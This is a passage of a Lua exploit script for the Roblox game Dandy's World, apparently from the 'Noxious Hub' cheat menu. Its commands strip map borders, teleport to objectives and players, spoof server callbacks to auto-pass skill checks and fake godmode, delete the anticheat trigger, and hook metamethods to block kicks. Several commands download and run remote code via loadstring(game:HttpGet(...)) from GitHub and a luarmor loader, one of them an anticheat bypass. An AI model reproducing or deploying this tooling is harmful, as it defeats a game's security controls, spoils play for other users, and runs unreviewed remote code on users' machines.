		if part:IsA("BasePart") then
			-- Remove textures and decals
			for _, descendant in pairs(part:GetDescendants()) do
				if descendant:IsA("Decal") or descendant:IsA("Texture") then
					descendant:Destroy()
				end
			end

			-- Clear mesh textures if applicable
			if part:IsA("MeshPart") then
				part.TextureID = ""
			end

			-- Apply ghost appearance
			part.Material = Enum.Material.ForceField
			part.Transparency = (part.Name == "HumanoidRootPart") and 1 or 0

			-- Apply color if specified (not for rainbow mode)
			if color then
				part.Color = color
			end
		end
	end
end

function rainbowGhostCharacter()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()

	-- Reset any existing ghost mode
	if currentGhostMode then
		resetCharacter(character)
	end

	-- Store original properties
	storeOriginalProperties(character)

	-- Apply ghost appearance
	removeTexturesAndChangeAppearance(character)

	-- Start rainbow effect
	createRainbowLoop(character)
	currentGhostMode = "rainbow"
end

function solidGhostCharacter(color)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()

	-- Reset any existing ghost mode
	if currentGhostMode then
		resetCharacter(character)
	end

	-- Store original properties
	storeOriginalProperties(character)

	-- Apply ghost appearance with color
	removeTexturesAndChangeAppearance(character, color)
	currentGhostMode = "solid"
end

-- Predefined color map
local colorMap = {
	red = Color3.fromRGB(255, 0, 0), r = Color3.fromRGB(255, 0, 0),
	orange = Color3.fromRGB(255, 100, 0), o = Color3.fromRGB(255, 100, 0),
	yellow = Color3.fromRGB(255, 255, 0), y = Color3.fromRGB(255, 255, 0),
	green = Color3.fromRGB(0, 255, 0), gn = Color3.fromRGB(0, 255, 0),
	cyan = Color3.fromRGB(0, 255, 255), c = Color3.fromRGB(0, 255, 255),
	blue = Color3.fromRGB(0, 0, 255), be = Color3.fromRGB(0, 0, 255),
	purple = Color3.fromRGB(176, 38, 255), pe = Color3.fromRGB(176, 38, 255),
	pink = Color3.fromRGB(255, 0, 255), pk = Color3.fromRGB(255, 0, 255),
	brown = Color3.fromRGB(137,81,41), bn = Color3.fromRGB(137,81,41),
	white = Color3.fromRGB(255, 255, 255), w = Color3.fromRGB(255, 255, 255),
	gray = Color3.fromRGB(110, 110, 110), gy = Color3.fromRGB(110, 110, 110),
	black = Color3.new(0, 0, 0), bk = Color3.new(0, 0, 0),
}

-- Command implementations
addcommand("ghostcharacter", "gc", function(args)
	local colorName = args and args:lower() or nil

	-- Reset if no color specified
	if not colorName or colorName == "" then
		local character = game.Players.LocalPlayer.Character
		if character then
			resetCharacter(character)
			currentGhostMode = nil
			stopRainbowLoop()
		end
		return
	end

	-- Check for rainbow mode
	if colorName == "rainbow" or colorName == "rb" then
		rainbowGhostCharacter()
		return
	end

	-- Check for valid color
	local color = colorMap[colorName]
	if color then
		solidGhostCharacter(color)
	end
end)

addcommand("ghostcharacter rainbow", "gc rainbow", function()
	rainbowGhostCharacter()
end)

addcommand("ghostcharacter rb", "gc rb", function()
	rainbowGhostCharacter()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("polaris", "code", function()



































end)

-------------------------------------------------------------------------------------------------------------------------------

local isfullbrightlooping = false
local fullbrightloopconnection
local originalSettings = {}

function saveOriginalSettings()
	local Lighting = game:GetService"Lighting"		
	originalSettings.Brightness = Lighting.Brightness
	originalSettings.ClockTime = Lighting.ClockTime
	originalSettings.FogEnd = Lighting.FogEnd
	originalSettings.GlobalShadows = Lighting.GlobalShadows
	originalSettings.OutdoorAmbient = Lighting.OutdoorAmbient
end

function restoreOriginalSettings()
	local Lighting = game:GetService"Lighting"		
	Lighting.Brightness = originalSettings.Brightness
	Lighting.ClockTime = originalSettings.ClockTime
	Lighting.FogEnd = originalSettings.FogEnd
	Lighting.GlobalShadows = originalSettings.GlobalShadows
	Lighting.OutdoorAmbient = originalSettings.OutdoorAmbient
end

function fullBright()
	local Lighting = game:GetService"Lighting"		
	Lighting.Brightness = 2
	Lighting.ClockTime = 14
	Lighting.FogEnd = 100000
	Lighting.GlobalShadows = false
	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
end

addcommand("enablefullbright", "efb", function()
	if not isfullbrightlooping then
		isfullbrightlooping = true
		saveOriginalSettings()
		fullbrightloopconnection = noxious["run service"].RenderStepped:Connect(function()
			fullBright()
		end)
	end
end)

addcommand("disablefullbright", "dfb", function()
	if isfullbrightlooping then
		isfullbrightlooping = false
		if fullbrightloopconnection then
			fullbrightloopconnection:Disconnect()
			fullbrightloopconnection = nil
		end
		restoreOriginalSettings()
	end
end)

local alternativeFullBrightEnabled = false
local fullBrightLoop

addcommand("enablealternativefullbright", "eafb", function()
	if alternativeFullBrightEnabled then return end
	alternativeFullBrightEnabled = true

	spawn(function() disableFullBright() end)
	spawn(function() saveOriginalSettings() end)

	fullBrightLoop = noxious["run service"].RenderStepped:Connect(function()
		if alternativeFullBrightEnabled then
			game.Lighting.Brightness = 2
			game.Lighting.FogEnd = 100000
			game.Lighting.GlobalShadows = false
			game.Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end
	end)
end)

addcommand("disablealternativefullbright", "dafb", function()
	if not alternativeFullBrightEnabled then return end
	alternativeFullBrightEnabled = false

	spawn(function() disableFullBright() end)
	spawn(function() restoreOriginalSettings() end)

	if fullBrightLoop then
		fullBrightLoop:Disconnect()
		fullBrightLoop = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("deletedeveloperdoors", "ddd", function()
	workspace.DevDoor:Destroy()
	workspace.DevDoor2:Destroy()
end)

-------------------------------------------------------------------------------------------------------------------------------

local dibloop = false

function dib()
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")

	if currentRoom then
		local model = currentRoom:FindFirstChildOfClass("Model")

		if model then
			local freeArea = model:FindFirstChild("FreeArea")
			if freeArea then
				for _, child in ipairs(freeArea:GetChildren()) do
					if child:IsA("Part") and (child.Name == "InvisBorder" or child.Name == "InvisibleWall") then
						child:Destroy()
					end
				end
			end

			local generatedBorders = model:FindFirstChild("GeneratedBorders")
			if generatedBorders then
				generatedBorders:Destroy()
			end

			local borders = model:FindFirstChild("Borders")
			if borders then
				borders:Destroy()
			end

			local walls = model:FindFirstChild("Walls")
			if walls then
				for _, child in ipairs(walls:GetChildren()) do
					if child:IsA("Part") and child.Name == "InvisibleWall" then
						child:Destroy()
					end
				end
			end
		end
	end
end

if dibloop == true then
	local floorActiveValue = game.Workspace:WaitForChild("Info"):WaitForChild("FloorActive")

	local function onFloorActiveChanged()
		dib()
	end

	floorActiveValue.Changed:Connect(onFloorActiveChanged)
end

addcommand("deleteinvisibleborders", "dib", function()
	dibloop = true
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("antilag", "boostfps", function()
	local Terrain = workspace:FindFirstChildOfClass("Terrain")
	local Lighting = game:GetService("Lighting")
	local RunService = game:GetService("RunService")

	Terrain.WaterWaveSize = 0
	Terrain.WaterWaveSpeed = 0
	Terrain.WaterReflectance = 0
	Terrain.WaterTransparency = 0
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 9e9

	if game.PlaceId ~= noxious["test game"] then
		settings().Rendering.QualityLevel = 1
	end

	-- Initial optimization
	local function optimizeInstance(v)
		if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
			v.Material = Enum.Material.Plastic
			v.Reflectance = 0
		elseif v:IsA("Decal") then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Lifetime = NumberRange.new(0)
		elseif v:IsA("Explosion") then
			v.BlastPressure = 1
			v.BlastRadius = 1
		elseif v:IsA("ForceField") or v:IsA("Sparkles") or v:IsA("Smoke") or v:IsA("Fire") then
			v:Destroy()
		end
	end

	for _, v in ipairs(game:GetDescendants()) do
		optimizeInstance(v)
	end

	for _, v in ipairs(Lighting:GetDescendants()) do
		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
			v.Enabled = false
		end
	end

	-- Batch processing
	local toProcess = {}

	workspace.DescendantAdded:Connect(function(child)
		table.insert(toProcess, child)
	end)

	while true do
		if #toProcess > 0 then
			local batch = toProcess
			toProcess = {}
			for _, child in ipairs(batch) do
				task.spawn(optimizeInstance, child)
			end
		end
		wait(1)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local maxDistanceEnabled = false

-- Function to set MaxDistance for a player's NameTag
function updmaxdist(player, distance)
	local function onchar(character)
		local HRP = character:WaitForChild("HumanoidRootPart", 5)
		if HRP then
			local nameTag = HRP:FindFirstChild"NameTag"				
			if nameTag and nameTag:IsA"BillboardGui"then
				nameTag.MaxDistance = distance
			end
		end
	end

	if player.Character then
		onchar(player.Character)
	end
	player.CharacterAdded:Connect(onchar)
end

-- Function to update all players' NameTags with the given distance
function applymaxdist(distance)
	for _, player in ipairs(game.Players:GetPlayers()) do
		updmaxdist(player, distance)
	end

	game.Players.PlayerAdded:Connect(function(player)
		updmaxdist(player, distance)
	end)
end

addcommand("enableinfinitenametagmaxdistance", "einmd", function()
	if not maxDistanceEnabled then
		maxDistanceEnabled = true
		applymaxdist(math.huge)
	end
end)

addcommand("disableinfinitenametagmaxdistance", "dinmd", function()
	if maxDistanceEnabled then
		maxDistanceEnabled = false
		applymaxdist(30) -- Set to a reasonable distance or default value
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Toggle state
local healthFrameVisibilityEnabled = false
local connection -- Variable to hold the connection

function updhealthframes(visibility, maxDistance)
	local playersFolder = workspace:FindFirstChild"InGamePlayers"		
	if not playersFolder then
		return false -- Stop if the folder is not found
	end

	for _, playerModel in ipairs(playersFolder:GetChildren()) do
		if playerModel:IsA"Model"then
			local loadoutFrame = playerModel:FindFirstChild"LoadoutFrame"				
			if loadoutFrame then
				-- Update MaxDistance
				if loadoutFrame:IsA"BillboardGui"then
					loadoutFrame.MaxDistance = maxDistance
				end

				local frame = loadoutFrame:FindFirstChild"Frame"					
				if frame then
					local healthFrame = frame:FindFirstChild"HealthFrame"						
					if healthFrame then
						healthFrame.Visible = visibility
					end
				end
			end
		end
	end

	return true -- Continue if the folder is found
end

addcommand("showplayerhealth", "sph", function()	
	if not healthFrameVisibilityEnabled then
		healthFrameVisibilityEnabled = true
		connection = noxious["run service"].Heartbeat:Connect(function()
			local playersFolderExists = updhealthframes(true, math.huge)
			if not playersFolderExists then
				execcmd("hideplayerhealth")
			end
		end)
	end
end)

addcommand("hideplayerhealth", "hph", function()
	if healthFrameVisibilityEnabled then
		healthFrameVisibilityEnabled = false
		-- Set visibility to false and reset MaxDistance to 30
		updhealthframes(false, 30)
		if connection then
			connection:Disconnect()
			connection = nil
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spawnshrimpo", "sps", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	local meshPart = Instance.new"MeshPart"		
	meshPart.Size = Vector3.new(1, 1, 1)
	meshPart.Anchored = false
	meshPart.CanCollide = true
	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
	meshPart.MeshId = "rbxassetid://78124401415554"
	meshPart.TextureID = "rbxassetid://88850093113717"

	meshPart.Parent = workspace
end)

addcommand("spawndandy", "spd", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	local meshPart = Instance.new"MeshPart"		
	meshPart.Size = Vector3.new(1, 1, 1)
	meshPart.Anchored = false
	meshPart.CanCollide = true
	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
	meshPart.MeshId = "rbxassetid://107019721797906"
	meshPart.TextureID = "rbxassetid://109038384710517"

	meshPart.Parent = workspace
end)

addcommand("spawntwisteddandy", "sptd", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	local meshPart = Instance.new"MeshPart"		
	meshPart.Size = Vector3.new(1, 1, 1)
	meshPart.Anchored = false
	meshPart.CanCollide = true
	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
	meshPart.MeshId = "rbxassetid://131467007179018"
	meshPart.TextureID = "rbxassetid://104745646981650"

	meshPart.Parent = workspace
end)

addcommand("spawnfishbowl", "spfb", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	local meshPart = Instance.new"MeshPart"		
	meshPart.Size = Vector3.new(1, 1, 1)
	meshPart.Anchored = false
	meshPart.CanCollide = true
	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
	meshPart.MeshId = "rbxassetid://86862554628040"
	meshPart.TextureID = "rbxassetid://86891402494139"

	meshPart.Parent = workspace
end)

addcommand("spawntv", "sptv", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	local meshPart = Instance.new"MeshPart"		
	meshPart.Size = Vector3.new(1, 1, 1)
	meshPart.Anchored = false
	meshPart.CanCollide = true
	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
	meshPart.MeshId = "rbxassetid://105769252421064"
	meshPart.TextureID = "rbxassetid://132807616662124"

	meshPart.Parent = workspace
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("teleporttoelevator", "tpte", function()
	local elevatorsFolder = workspace:FindFirstChild"Elevators"

	if elevatorsFolder then
		local elevatorModel = elevatorsFolder:FindFirstChildWhichIsA"Model"

		if elevatorModel then
			local monsterBlocker = elevatorModel:FindFirstChild"MonsterBlocker"

			if monsterBlocker and monsterBlocker:IsA"Part"then
				local character = game.Players.LocalPlayer.Character
				if character and character:FindFirstChild"HumanoidRootPart"then
					-- Apply the offset to the CFrame
					local offsetCFrame = monsterBlocker.CFrame * CFrame.new(0, -10.5, 0)
					character.HumanoidRootPart.CFrame = offsetCFrame
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local teleportEnabled = true
local hasTeleported = false
local heartbeatConnection
local lastPanicState = false

addcommand("enableautoteleporttoelevator", "eatpte", function()
	local workspace = game:GetService("Workspace")        
	local infoFolder = workspace:FindFirstChild("Info")

	if infoFolder then
		local panicBool = infoFolder:FindFirstChild("Panic")            
		if panicBool and panicBool:IsA("BoolValue") then
			if not heartbeatConnection or not heartbeatConnection.Connected then
				heartbeatConnection = noxious["run service"].Heartbeat:Connect(function()
					-- Check if panic state changed
					if lastPanicState ~= panicBool.Value then
						lastPanicState = panicBool.Value
						-- Reset hasTeleported when panic is disabled
						if not panicBool.Value then
							hasTeleported = false
						end
					end

					if teleportEnabled and panicBool.Value == true and not hasTeleported then
						local elevatorsFolder = workspace:FindFirstChild("Elevators")                            
						if elevatorsFolder then
							local elevatorModel = elevatorsFolder:FindFirstChildWhichIsA("Model")                                
							if elevatorModel then
								local monsterBlocker = elevatorModel:FindFirstChild("MonsterBlocker")                                    
								if monsterBlocker and monsterBlocker:IsA("Part") then
									local character = game.Players.LocalPlayer.Character
									if character and character:FindFirstChild("HumanoidRootPart") then
										local offsetCFrame = monsterBlocker.CFrame * CFrame.new(0, -10.5, 0)
										character.HumanoidRootPart.CFrame = offsetCFrame
										hasTeleported = true -- only teleport once
									end
								end
							end
						end
					end
				end)
			end
		end
	end
end)

addcommand("disableautoteleporttoelevator", "datpte", function()
	teleportEnabled = false
	hasTeleported = false
	if heartbeatConnection then
		heartbeatConnection:Disconnect()
		heartbeatConnection = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local isCheckingGates = false -- Controls whether the gate checking is active
local checkGatesConnection -- Stores the RenderStepped connection

function TP(Target)
	game.Workspace.Gravity = 0
	local LocalPlayer = game.Players.LocalPlayer
	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	if typeof(Target) == "Instance" and Target:IsA"BasePart"then
		Character:SetPrimaryPartCFrame(Target.CFrame)
	end
	game.Workspace.Gravity = 196.2
end

function checkGates()
	for _, model in ipairs(workspace:GetChildren()) do
		if model:IsA"Model"and model.Name:lower() == "gate" then
			local guiPart = model:FindFirstChild"GuiPart"				
			if guiPart and guiPart:IsA"BasePart"then
				local surfaceGui = guiPart:FindFirstChild"SurfaceGui"					
				if surfaceGui then
					local frame = surfaceGui:FindFirstChild"Frame"						
					if frame then
						local playersTextLabel = frame:FindFirstChild"players"							
						if playersTextLabel and playersTextLabel:IsA"TextLabel"then
							local textValue = playersTextLabel.Text

							if textValue == "7/8" or textValue == "7 / 8" or textValue == "7/ 8" or textValue == "7 /8" then
								TP(guiPart)
								return
							end
						end
					end
				end
			end
		end
	end
end

addcommand("enableautoteleportto7playerelevator", "eatpt7pe", function()
	if not isCheckingGates then
		isCheckingGates = true
		checkGatesConnection = game["Run Service"].RenderStepped:Connect(function()
			checkGates()
		end)
	end
end)

addcommand("disableautoteleportto7playerelevator", "datpt7pe", function()
	if isCheckingGates then
		isCheckingGates = false
		if checkGatesConnection then
			checkGatesConnection:Disconnect()
			checkGatesConnection = nil
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Variables to manage the teleportation process
local atptg2tpconnection = nil
local atptg2decodingconnection = nil
local atptg2tpdelay = 1 -- Delay in seconds before teleporting after decoding starts
local atptg2ismonitoring = false -- Track if we're currently monitoring
local hastpdtoagen = false -- Track if we've already teleported during this decoding session

function atptg2ismonsterneargen(generator, radius)
	local currentRoom = workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local monstersFolder = model:FindFirstChild("Monsters")
				if monstersFolder then
					for _, monster in pairs(monstersFolder:GetChildren()) do
						if monster:IsA("Model") and monster.PrimaryPart then
							local distance = (monster.PrimaryPart.Position - generator.PrimaryPart.Position).Magnitude
							if distance <= radius then
								return true
							end
						end
					end
				end
			end
		end
	end
	return false
end

function tptg()
	local currentRoom = workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		for _, item in pairs(currentRoom:GetChildren()) do
			if item:IsA("Model") then
				local generatorsFolder = item:FindFirstChild("Generators")
				if generatorsFolder then
					local generators = {}
					for _, generator in pairs(generatorsFolder:GetChildren()) do
						if generator:IsA("Model") and generator.PrimaryPart then
							local statsFolder = generator:FindFirstChild("Stats")
							if statsFolder then
								local completedValue = statsFolder:FindFirstChild("Completed")
								if completedValue and completedValue:IsA("BoolValue") and not completedValue.Value then
									if not atptg2ismonsterneargen(generator, 20) and not isConnieActive(generator) then
										table.insert(generators, generator)
									end
								end
							end
						end
					end

					if #generators > 0 then
						local randomGenerator = generators[math.random(1, #generators)]
						local generatorCFrame = randomGenerator:GetPrimaryPartCFrame()
						local forwardPosition = generatorCFrame.Position + generatorCFrame.LookVector * 4
						local targetCFrame = CFrame.new(forwardPosition, generatorCFrame.Position) * CFrame.new(0, 2.3, 0)
						character:SetPrimaryPartCFrame(targetCFrame)
						hastpdtoagen = true
					end
				end
			end
		end
	end
end

-- Function to handle the decoding state changes
function atptg2decodstat(deconvalue)
	-- Clean up any existing teleport connections
	if atptg2tpconnection then
		atptg2tpconnection:Disconnect()
		atptg2tpconnection = nil
	end

	if deconvalue and atptg2ismonitoring and not hastpdtoagen then
		atptg2tpconnection = noxious["run service"].Heartbeat:Connect(function(dt)
			atptg2tpdelay = atptg2tpdelay - dt
			if atptg2tpdelay <= 0 then
				atptg2tpconnection:Disconnect()
				atptg2tpconnection = nil
				tptg() -- Only teleport once
			end
		end)
	elseif not deconvalue then
		hastpdtoagen = false -- Reset teleport flag when decoding stops
	end
end

addcommand("enableautoteleporttogenerator", "eatptg", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild("HumanoidRootPart")
	local inGamePlayerModel = workspace:FindFirstChild("InGamePlayers"):FindFirstChild(player.Name)

	local decodingObject = inGamePlayerModel:FindFirstChild("Decoding")
	if atptg2ismonitoring then return end -- Already monitoring

	atptg2ismonitoring = true
	hastpdtoagen = false -- Reset teleport flag when starting monitoring

	-- Connect to decoding changes
	atptg2decodingconnection = decodingObject.Changed:Connect(function(newValue)
		-- Reset the delay timer whenever decoding state changes
		atptg2tpdelay = 1
		atptg2decodstat(newValue ~= nil)
	end)

	-- Initial check
	atptg2decodstat(decodingObject.Value ~= nil)
end)

addcommand("disableautoteleporttogenerator2", "datptg2", function()
	if not atptg2ismonitoring then return end -- Not monitoring

	atptg2ismonitoring = false
	hastpdtoagen = false -- Reset teleport flag when stopping monitoring

	-- Disconnect all connections
	if atptg2decodingconnection then
		atptg2decodingconnection:Disconnect()
		atptg2decodingconnection = nil
	end

	if atptg2tpconnection then
		atptg2tpconnection:Disconnect()
		atptg2tpconnection = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function isConnieActive(generator)
	local statsFolder = generator:FindFirstChild("Stats")
	local connie = statsFolder and statsFolder:FindFirstChild("Connie")
	if connie and connie:IsA("BoolValue") and connie.Value then
		return true
	end
	return false
end

addcommand("teleporttogenerator", "tptg", function()
	spawn(function() execcmd("noclip") end)
	wait(0.2)

	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	local currentRoom = workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		for _, item in pairs(currentRoom:GetChildren()) do
			if item:IsA("Model") then
				local generatorsFolder = item:FindFirstChild("Generators")
				if generatorsFolder then
					local generators = {}
					for _, generator in pairs(generatorsFolder:GetChildren()) do
						if generator:IsA("Model") and generator.PrimaryPart then
							local statsFolder = generator:FindFirstChild("Stats")
							if statsFolder then
								local completedValue = statsFolder:FindFirstChild("Completed")
								if completedValue and completedValue:IsA("BoolValue") and not completedValue.Value then
									if not isConnieActive(generator) then
										table.insert(generators, generator)
									end
								end
							end
						end
					end

					if #generators > 0 then
						local randomGenerator = generators[math.random(1, #generators)]
						local generatorCFrame = randomGenerator:GetPrimaryPartCFrame()
						local forwardPosition = generatorCFrame.Position + generatorCFrame.LookVector * 4
						local targetCFrame = CFrame.new(forwardPosition, generatorCFrame.Position) * CFrame.new(0, -3.3, 0)

						tpBypass(targetCFrame)
						humanoidRootPart.CFrame = targetCFrame
						wait(0.2)
						spawn(function() execcmd("clip") end)
					end
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function findplr(partialName)
	for _, player in ipairs(game.Players:GetPlayers()) do
		if player.Name:lower():sub(1, #partialName) == partialName:lower() then
			return player
		end
	end
	return nil
end

addcommand("teleportto", "to", function(args)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	local targetPlayer
	if args:lower() == "random" then
		local players = game.Players:GetPlayers()
		if #players > 0 then
			targetPlayer = players[math.random(1, #players)]
		end
	else
		targetPlayer = findplr(args)
	end

	if targetPlayer then
		local targetCharacter = targetPlayer.Character
		if targetCharacter and targetCharacter:FindFirstChild"HumanoidRootPart"then
			local targetRootPart = targetCharacter.HumanoidRootPart

			local behindPosition = targetRootPart.CFrame * CFrame.new(0, 0, 3)
			humanoidRootPart.CFrame = behindPosition
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("teleporttoadminroom", "tptar", function()
	if game.PlaceId ~= noxious["dandy's world lobby"] then notify("You can only run this command in the lobby.", 5, "warning") return end
	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
	local targetPosition = Vector3.new(-43, 21, 24)
	humanoidRootPart.CFrame = CFrame.new(targetPosition)
end)

addcommand("teleporttobedroom", "tptbr", function()
	if game.PlaceId ~= noxious["dandy's world lobby"] then notify("You can only run this command in the lobby.", 5, "warning") return end
	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
	local targetPosition = Vector3.new(-175, 8, 49)
	humanoidRootPart.CFrame = CFrame.new(targetPosition)
end)

addcommand("teleporttodandysshop", "tptds", function()
	if game.PlaceId ~= noxious["dandy's world lobby"] then notify("You can only run this command in the lobby.", 5, "warning") return end
	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
	local targetPosition = Vector3.new(-19, 21, 17)
	humanoidRootPart.CFrame = CFrame.new(targetPosition)
end)

addcommand("teleporttoboxofdoom", "tptbod", function()
	if game.PlaceId ~= noxious["dandy's world lobby"] then notify("You can only run this command in the lobby.", 5, "warning") return end
	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
	local targetPosition = Vector3.new(-215, 3, -215)
	humanoidRootPart.CFrame = CFrame.new(targetPosition)
end)

addcommand("teleporttostage", "tpts", function()
	if game.PlaceId ~= noxious["dandy's world lobby"] then notify("You can only run this command in the lobby.", 5, "warning") return end
	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
	local targetPosition = Vector3.new(-3, 33, 492)
	humanoidRootPart.CFrame = CFrame.new(targetPosition)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("speedchangergui", "scgui", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Miscellaneous/Speed%20Changer%20GUI"))()
end)

addcommand("autofarmgui", "afgui", function()
	execcmd("nccam")
	execcmd("maxzoom inf")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Dandy's%20World/Autofarm%20GUI"))()
end)

addcommand("oldautofarmgui", "oafgui", function()
	execcmd("nccam")
	execcmd("maxzoom inf")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Dandy's%20World/%5BOld%5D%20Autofarm%20GUI"))()
end)

addcommand("unionautofarm", "unionaf", function()
	execcmd("nccam")
	execcmd("maxzoom inf")	
	local s = game:HttpGet("https://api.luarmor.net/files/v3/loaders/49070d904c420087ca216a958ed26cca.lua")
	local r = loadstring(s)
	if typeof(r) == "function" then 
		pcall(r)
	else 
		print("[Riddance]: Failed to load Dandy's World autofarm.", r)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("enablegodmode", "egm", function()
	game:GetService("ReplicatedStorage").Events.GetCharacterPosition.OnClientInvoke = function()
		return noxious["local player"].Character.HumanoidRootPart.CFrame
	end;
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("removeanticheat", "rac", function()
	local ReplicatedStorage = game:GetService"ReplicatedStorage"		
	local eventsFolder = ReplicatedStorage:FindFirstChild"Events"

	if eventsFolder then
		local antiCheatTrigger = eventsFolder:FindFirstChild"AntiCheatTrigger"			
		if antiCheatTrigger then
			antiCheatTrigger:Destroy()
		end
	end
	notify("The anticheat isnt fully removed.", 5, "warning")
end)

addcommand("bypassanticheat", "bac", function()
	notify("Executing the command twice will freeze / crash the game.", 5, "warning")
	loadstring(game:HttpGet"https://raw.githubusercontent.com/Next1x/Nextix./main/UniversalACBypass")()
end)

-------------------------------------------------------------------------------------------------------------------------------

local autocalibration = false

function handleSkillCheck()
	local VIM = game:GetService'VirtualInputManager'		
	local tl = 5
	local screengui = noxious["local player"].PlayerGui:FindFirstChild"ScreenGui"		
	if not screengui then
		return
	end

	local menu = screengui:FindFirstChild"Menu"		
	if not menu then
		return
	end

	local skillcheckframe = menu:FindFirstChild"SkillCheckFrame"		
	if not skillcheckframe then
		return
	end

	local function visibledisrupt()
		if autocalibration and skillcheckframe.Visible then
			local marker = skillcheckframe:FindFirstChild"Marker"				
			local goldarea = skillcheckframe:FindFirstChild"GoldArea"

			if marker and goldarea then
				local markerPosition = marker.AbsolutePosition
				local goldAreaPosition = goldarea.AbsolutePosition
				local goldAreaSize = goldarea.AbsoluteSize

				if markerPosition.X >= goldAreaPosition.X and markerPosition.X <= (goldAreaPosition.X + goldAreaSize.X) + tl then
					-- Send spacebar press event
					VIM:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
				end
			end
		end
	end

	skillcheckframe.Changed:Connect(function(property)
		if property == "Visible" then
			visibledisrupt()
		end
	end)

	local marker = skillcheckframe:FindFirstChild"Marker"		
	local goldarea = skillcheckframe:FindFirstChild"GoldArea"

	if marker then
		marker.Changed:Connect(function(property)
			if property == "AbsolutePosition" then
				visibledisrupt()
			end
		end)
	end

	if goldarea then
		goldarea.Changed:Connect(function(property)
			if property == "AbsolutePosition" or property == "AbsoluteSize" then
				visibledisrupt()
			end
		end)
	end
end

handleSkillCheck()

addcommand("enableautocalibration", "eac", function()
	autocalibration = true
end)

addcommand("disableautocalibration", "dac", function()
	autocalibration = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("enableautocalibration2", "eac2", function()
	game.ReplicatedStorage.Events.SkillcheckUpdate.OnClientInvoke = function() return "supercomplete" end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("enableantikick", "eak", function()
	if not hookmetamethod then 
		return notify("Your exploit does not support this command.", 5, "error")
	end
	local oldhmmi
	local oldhmmnc
	oldhmmi = hookmetamethod(game, "__index", function(self, method)
		if self == noxious["local player"] and method:lower() == "kick" then
			return error("Expected ':' not '.' calling member function Kick", 2)
		end
		return oldhmmi(self, method)
	end)
	oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
